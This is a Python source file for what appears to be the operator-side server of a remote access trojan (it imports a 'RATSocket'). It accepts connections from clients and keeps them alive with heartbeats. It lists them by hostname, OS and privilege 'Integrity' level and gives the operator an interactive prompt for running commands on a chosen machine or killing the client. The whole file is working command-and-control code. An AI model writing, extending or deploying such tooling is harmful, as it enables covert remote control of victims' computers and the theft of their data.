import json
import os
import socket
import subprocess
import sys
import threading
import time

from core.protocol.ratsocket import RATSocket
from core.utils.formatting import print_table
from core.utils.logger import logger
from core.utils.parsing import parse
from core.utils.server_util import *
from server.application.app_facade import ServerWebService
from server.application.command.alias_manager import AliasManager
from server.application.history.history_orchestrator import CommandHistoryOrchestrator
from server.application.history.history_store import CommandHistoryStore
from server.config.config import SOCKET_ADDR, HEARTBEAT_INTERVAL_SECONDS
from server.connection.client_session import ClientSession
from server.connection.connection_manager import ConnectionManager
from server.connection.transport.client_transport import ClientTransport


class Server:

    def __init__(self, address):
        """
        初始化服务器对象
        :param address: 服务器地址
        """
        self.address = address
        self.socket = RATSocket()
        self.connections = ConnectionManager()
        self.alias_manager = AliasManager()
        self.command_history = CommandHistoryStore()
        self.command_history_orchestrator = CommandHistoryOrchestrator(self.command_history)

        # composition root:
        # 由 Server 负责触发应用层装配，再拿到 Facade。
        self.web_service = ServerWebService.from_server(self)

    # ------------------ connection lookup ------------------ #
    def get_target_connection_by_client_id(self, client_id) -> ClientSession:
        try:
            return self.connections.get_by_client_id(client_id)
        except Exception:
            raise Exception('Not a valid selection')

    def kill_connection_by_client_id(self, client_id):
        session = self.get_target_connection_by_client_id(client_id)
        session.send_command('kill')

    # ------------------ heartbeat ------------------ #
    def heartbeat_loop(self):
        """
        周期性向所有在线 session 发送 heartbeat。
        """
        while 1:
            try:
                sessions = self.connections.all()
                for session in sessions:
                    try:
                        session.services.heartbeat_service.send_heartbeat()
                    except Exception as e:
                        logger.debug(f'Failed to send heartbeat to {session.address}: {e}')
            except Exception as e:
                logger.error(f'Heartbeat loop error: {e}', exc_info=True)

            time.sleep(HEARTBEAT_INTERVAL_SECONDS)

    # ------------------ 连接建立 ------------------ #
    def _bind_server_socket(self):
        """
        绑定并启动监听
        """
        self.socket.bind(self.address)
        logger.info('Listening on port {}'.format(self.address[1]))

    def _receive_client_info(self, raw_sock, addr):
        """
        接收客户端初始信息
        """
        raw_sock.settimeout(5)
        try:
            transport = ClientTransport(raw_sock, addr)
            return transport.recv(), transport
        finally:
            raw_sock.settimeout(None)

    def _build_connection_info(self, addr, info: dict) -> dict:
        """
        构造客户端连接信息
        """
        return {**{'addr': f'{addr[0]}:{addr[1]}'}, **info}

    def _register_connection(self, transport: ClientTransport, addr, info: dict) -> ClientSession:
        session = self.web_service.create_web_connection(transport, addr, info)
        self.connections.add(session)
        logger.info('Connection has been established: {}'.format(addr))
        self.web_service.handle_connection_registered(session)
        return session

    def _accept_connection(self):
        """
        接受一个新连接并完成初始化
        """
        raw_sock, addr = self.socket.accept()

        try:
            info, transport = self._receive_client_info(raw_sock, addr)
        except json.JSONDecodeError:
            raw_sock.close()
            logger.error('Failed to establish session: invalid client handshake from {}'.format(addr))
            return None
        except Exception as e:
            raw_sock.close()
            logger.error('Error establishing connection: {}'.format(e))
            return None

        info = self._build_connection_info(addr, info)
        return self._register_connection(transport, addr, info)

    def _start_connection_handler(self, session):
        """
        启动客户端会话接收线程
        """
        threading.Thread(
            target=self.connection_handler,
            args=(session,),
            daemon=True
        ).start()

    def serve(self):
        """
        接受新连接的线程
        """
        try:
            self._bind_server_socket()
        except Exception as e:
            logger.error('Error binding socket: {}'.format(e))
            return

        while 1:
            try:
                session = self._accept_connection()
                if session is None:
                    continue
                self._start_connection_handler(session)
            except socket.error as e:
                logger.error(e)

    # ------------------ 连接生命周期 ------------------ #
    def _notify_connection_closed(self, session: ClientSession):
        """
        通知等待中的主线程：该连接已关闭
        """
        session.runtime.message_queue.put(0, None, 1)

    def _remove_connection(self, session: ClientSession):
        """
        从连接管理器中移除连接
        """
        self.connections.remove(session)

    def _handle_connection_closed(self, session: ClientSession):
        """
        处理连接关闭后的清理逻辑
        """
        logger.error(f'Connection closed: {session.address}')
        self.web_service.handle_connection_closed(session)
        self._notify_connection_closed(session)
        self._remove_connection(session)

    def _handle_connection_receive_error(self, session: ClientSession):
        """
        处理接收线程中的非致命异常
        """
        logger.error(f'Error receiving from {session.address}', exc_info=True)
        time.sleep(1)

    # ------------------ 子线程接收 ------------------ #
    def connection_handler(self, session):
        """
        处理接收的子线程
        """
        while 1:
            try:
                session.recv_message()
            except socket.error:
                self._handle_connection_closed(session)
                break
            except Exception:
                self._handle_connection_receive_error(session)

    # ------------------ 连接查询 ------------------ #
    def list_connections(self):
        """
        显示连接列表
        """
        connection_list = self.connections.all()
        if not connection_list:
            print("No active sessions")
            return

        headers = ['ID', 'Address', 'OS', 'OS Version', 'Hostname', 'Integrity']
        data = [
            [
                str(i),
                session.info.get('addr', 'N/A'),
                session.info.get('os_type', 'Unknown'),
                session.info.get('os_ver', 'Unknown'),
                session.info.get('hostname', 'Unknown'),
                session.info.get('integrity', '?')
            ]
            for i, session in enumerate(connection_list)
        ]
        print_table(headers, data)

    def get_last_connection(self) -> ClientSession:
        try:
            return self.connections.all()[-1]
        except Exception:
            return None

    def get_connection(self, target: str = '') -> ClientSession:
        """
        获取目标会话
        """
        if target == '':
            return self.get_last_connection()
        else:
            return self.connections.find(target)

    # ------------------ 交互辅助 ------------------ #
    def _print_unread_messages(self, session: ClientSession):
        """
        打印该连接上次交互后积压的消息
        """
        unread = session.runtime.unread_message_manager.drain()
        for item in unread:
            level = item.get('level', 'info')
            text = item.get('text', '')
            if level == 'error':
                print_error(text)
            else:
                print(text)

    def _handle_interactive_control_command(self, session: ClientSession, cmd: str) -> bool:
        """
        处理交互期本地控制命令
        返回 True 表示应该退出当前连接交互
        """
        if cmd in ['bg', 'background', 'exit']:
            return True

        if cmd == 'clear':
            clear()
            return False

        return False

    def _execute_interactive_command(self, session: ClientSession, command_executor, cmd: str):
        """
        执行交互命令并输出结果
        """
        entry_id = self.command_history_orchestrator.begin_execution(
            session,
            cmd,
            source='cli',
        )

        final_ok = True

        try:
            func = command_executor.process_command(cmd, history_entry_id=entry_id)
            for item in func():
                status = item[0]
                write(*item)
                if status == 0:
                    final_ok = False
        except Exception:
            final_ok = False
            raise
        finally:
            self.command_history_orchestrator.finalize_execution(
                session,
                entry_id,
                final_ok,
                cwd_end=session.info.get('cwd', '')
            )

    def open_connection(self, session: ClientSession):
        """
        与会话交互
        """
        self._print_unread_messages(session)
        session.context.is_interactive = True

        command_executor = self.web_service.command_executor_factory.create(
            session,
            use_foreground_guard=True,
            foreground_source='cli'
        )
        try:
            while 1:
                try:
                    cmd = colored_input('{}> '.format(session.info['cwd']))
                    if not cmd.strip():
                        continue

                    if self._handle_interactive_control_command(session, cmd):
                        break

                    self._execute_interactive_command(session, command_executor, cmd)
                except Exception as e:
                    print_error(f'{e.__class__.__name__}: {e}')
        except socket.error:
            print_error('[-] Connection closed')
        except KeyboardInterrupt:
            print(Colors.RESET)
            time.sleep(0.1)
        except Exception as e:
            print_error(f'{e.__class__.__name__}: {e}')
        finally:
            session.context.is_interactive = False

    # ------------------ 主控台命令 ------------------ #
    def _handle_console_command(self, cmd: str):
        """
        处理主控台命令
        """
        name, arg = parse(cmd)

        if cmd in ['l', 'ls', 'list']:
            self.list_connections()
            return

        if name == 'i':
            session = self.get_connection(arg)
            self.open_connection(session)
            return

        raise ValueError('Invalid command')

    def _serve_console_loop(self):
        """
        主控台循环
        """
        while 1:
            try:
                cmd = colored_input('server> ')
                self._handle_console_command(cmd)
            except KeyboardInterrupt:
                print(Colors.RESET)
                sys.exit(0)
            except Exception as e:
                print_error('{}: {}'.format(e.__class__.__name__, e))


if __name__ == "__main__":
    server = Server(SOCKET_ADDR)

    heartbeat_thread = threading.Thread(target=server.heartbeat_loop)
    heartbeat_thread.daemon = True
    heartbeat_thread.start()

    server_thread = threading.Thread(target=server.serve)
    server_thread.daemon = True
    server_thread.start()

    server._serve_console_loop()